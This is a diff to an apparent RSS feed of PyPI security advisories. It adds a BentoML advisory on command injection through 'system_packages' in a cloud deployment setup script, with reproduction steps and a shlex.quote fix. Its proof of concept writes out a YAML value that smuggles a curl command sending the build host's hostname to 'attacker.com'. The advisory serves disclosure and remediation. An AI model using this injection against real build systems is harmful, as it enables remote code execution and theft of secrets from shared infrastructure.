@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-04-03T22:00:02.419Z</updated>
+    <updated>2026-04-03T22:42:03.585Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,116 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[bentoml] BentoML: Command Injection in cloud deployment setup script]]></title>
+        <id>https://github.com/advisories/GHSA-fgv4-6jr3-jgfw</id>
+        <link href="https://github.com/advisories/GHSA-fgv4-6jr3-jgfw"/>
+        <updated>2026-04-03T22:03:24.000Z</updated>
+        <content type="html"><![CDATA[<p>Commit ce53491 (March 24) fixed command injection via <code>system_packages</code> in Dockerfile templates and <code>images.py</code> by adding <code>shlex.quote</code>. However, the cloud deployment path in <code>src/bentoml/_internal/cloud/deployment.py</code> was not included in the fix. Line 1648 interpolates <code>system_packages</code> directly into a shell command using an f-string without any quoting.</p>
+<p>The generated script is uploaded to BentoCloud as <code>setup.sh</code> and executed on the cloud build infrastructure during deployment, making this a remote code execution on the CI/CD tier.</p>
+<h2 id="details">Details</h2>
+<p><strong>Fixed paths (commit ce53491):</strong></p>
+<ul>
+<li><code>src/_bentoml_sdk/images.py:88</code> - added <code>shlex.quote(package)</code></li>
+<li><code>src/bentoml/_internal/bento/build_config.py:505</code> - added <code>bash_quote</code> Jinja2 filter</li>
+<li>Jinja2 templates: <code>base_debian.j2</code>, <code>base_alpine.j2</code>, etc.</li>
+</ul>
+<p><strong>Unfixed path:</strong></p>
+<p><code>src/bentoml/_internal/cloud/deployment.py</code>, line 1648:</p>
+<pre><code>def _build_setup_script(bento_dir: str, image: Image | None) -&gt; bytes:
+    content = b""
+    config = BentoBuildConfig.from_bento_dir(bento_dir)
+    if config.docker.system_packages:
+        content += f"apt-get update &amp;&amp; apt-get install -y {' '.join(config.docker.system_packages)} || exit 1\n".encode()
+</code></pre>
+<p><code>system_packages</code> values from <code>bentofile.yaml</code> are joined with spaces and interpolated directly into the <code>apt-get install</code> command. No <code>shlex.quote</code>.</p>
+<p><strong>Remote execution confirmed:</strong></p>
+<ul>
+<li>Line 905: <code>setup_script = _build_setup_script(bento_dir, svc.image)</code> in <code>_init_deployment_files</code></li>
+<li>Line 908: <code>upload_files.append(("setup.sh", setup_script))</code> uploads to BentoCloud</li>
+<li>Line 914: <code>self.upload_files(upload_files, ...)</code> sends to the remote deployment</li>
+<li>The script runs on the cloud build infrastructure during container setup</li>
+</ul>
+<p><strong>Second caller at line 1068:</strong> <code>_build_setup_script</code> is also called during <code>Deployment.watch()</code> for dev mode hot-reload deployments.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>bentofile.yaml:</p>
+<pre><code>service: "service:svc"
+docker:
+  system_packages:
+    - "curl"
+    - "jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}#"
+</code></pre>
+<p>Generated setup.sh:</p>
+<pre><code>apt-get update &amp;&amp; apt-get install -y curl jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}# || exit 1
+</code></pre>
+<p>The semicolon terminates the <code>apt-get</code> command. <code>${IFS}</code> is used for spaces (works in bash, avoids YAML parsing issues). The <code>#</code> comments out the trailing <code>|| exit 1</code>. The injected <code>curl</code> exfiltrates the hostname of the build infrastructure to the attacker.</p>
+<h2 id="impact">Impact</h2>
+<p>A malicious <code>bentofile.yaml</code> achieves remote code execution on BentoCloud's build infrastructure (or enterprise Yatai/Kubernetes build nodes) during deployment. Attack scenarios:</p>
+<ol>
+<li><strong>Supply chain:</strong> A shared Bento from a public model hub contains a poisoned <code>bentofile.yaml</code>. When deployed to BentoCloud, the injected command runs on the build infrastructure.</li>
+<li><strong>Insider threat:</strong> A data scientist with deploy permissions injects commands into <code>system_packages</code> to exfiltrate secrets from the build environment (cloud credentials, API keys, other tenants' data).</li>
+<li><strong>CI/CD compromise:</strong> The build infrastructure typically has access to container registries, artifact storage, and deployment APIs, making this a pivot point for broader infrastructure compromise.</li>
+</ol>
+<h2 id="local-reproduction-steps">Local Reproduction Steps</h2>
+<p>Tested and confirmed on Ubuntu with BentoML source at commit 0772581.</p>
+<p>Step 1: Create a directory with a malicious bentofile.yaml:</p>
+<pre><code>mkdir /tmp/bento-pwn
+cat &gt; /tmp/bento-pwn/bentofile.yaml &lt;&lt; 'EOF'
+service: "service:svc"
+docker:
+  system_packages:
+    - "curl"
+    - "jq; touch /tmp/PWNED_BY_INJECTION #"
+EOF
+</code></pre>
+<p>Step 2: Generate the setup script using the vulnerable code path (extracted from deployment.py:1648):</p>
+<pre><code>python3 -c "
+import yaml
+with open('/tmp/bento-pwn/bentofile.yaml') as f:
+    config = yaml.safe_load(f)
+pkgs = config['docker']['system_packages']
+script = f\"apt-get update &amp;&amp; apt-get install -y {' '.join(pkgs)} || exit 1\n\"
+print('Generated setup.sh:')
+print(script)
+with open('/tmp/bento-pwn/setup.sh', 'w') as f:
+    f.write(script)
+"
+</code></pre>
+<p>Step 3: Execute and verify:</p>
+<pre><code>rm -f /tmp/PWNED_BY_INJECTION
+bash /tmp/bento-pwn/setup.sh
+ls -la /tmp/PWNED_BY_INJECTION
+</code></pre>
+<p>Result: <code>/tmp/PWNED_BY_INJECTION</code> is created, confirming the injected <code>touch</code> command executed. The semicolon broke out of <code>apt-get install</code>, the injected command ran, and <code>#</code> commented out the error handler.</p>
+<p>Generated setup.sh content:</p>
+<pre><code>apt-get update &amp;&amp; apt-get install -y curl jq; touch /tmp/PWNED_BY_INJECTION # || exit 1
+</code></pre>
+<p>For comparison, the fixed version (with shlex.quote) would generate:</p>
+<pre><code>apt-get update &amp;&amp; apt-get install -y curl 'jq; touch /tmp/PWNED_BY_INJECTION #' || exit 1
+</code></pre>
+<p>The single quotes from shlex.quote neutralize the semicolon and hash, treating the entire string as a literal package name argument to apt-get.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Apply <code>shlex.quote</code> to each package name, matching the fix in <code>images.py</code>:</p>
+<pre><code>if config.docker.system_packages:
+    quoted = ' '.join(shlex.quote(p) for p in config.docker.system_packages)
+    content += f"apt-get update &amp;&amp; apt-get install -y {quoted} || exit 1\n".encode()
+</code></pre>
+<p>— Koda Reef</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-fgv4-6jr3-jgfw">https://github.com/bentoml/BentoML/security/advisories/GHSA-fgv4-6jr3-jgfw</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33744">https://nvd.nist.gov/vuln/detail/CVE-2026-33744</a></li>
+<li><a href="https://github.com/advisories/GHSA-fgv4-6jr3-jgfw">https://github.com/advisories/GHSA-fgv4-6jr3-jgfw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fgv4-6jr3-jgfw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-03T22:03:22.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[litellm] LiteLLM: Authentication bypass via OIDC userinfo cache key collision]]></title>
         <id>https://github.com/advisories/GHSA-jjhc-v7c2-5hh6</id>
@@ -1528,30 +1638,5 @@ This is reachable through multiple entry points: <code>catalog.load(..., version
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-04-03T03:46:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[dtale] D-Tale: Remote Code Execution through redis/shelf storage]]></title>
-        <id>https://github.com/advisories/GHSA-436g-fhfc-9g5w</id>
-        <link href="https://github.com/advisories/GHSA-436g-fhfc-9g5w"/>
-        <updated>2026-04-03T03:44:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Users hosting D-Tale publicly while using a redis or shelf storage layer could be vulnerable to remote code execution allowing attackers to run malicious code on the server.</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to version 3.22.0.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There are no workarounds for versions &lt; 3.22.0</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/man-group/dtale/security/advisories/GHSA-436g-fhfc-9g5w">https://github.com/man-group/dtale/security/advisories/GHSA-436g-fhfc-9g5w</a></li>
-<li><a href="https://github.com/advisories/GHSA-436g-fhfc-9g5w">https://github.com/advisories/GHSA-436g-fhfc-9g5w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-436g-fhfc-9g5w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-03T03:44:39.000Z</published>
     </entry>
 </feed>
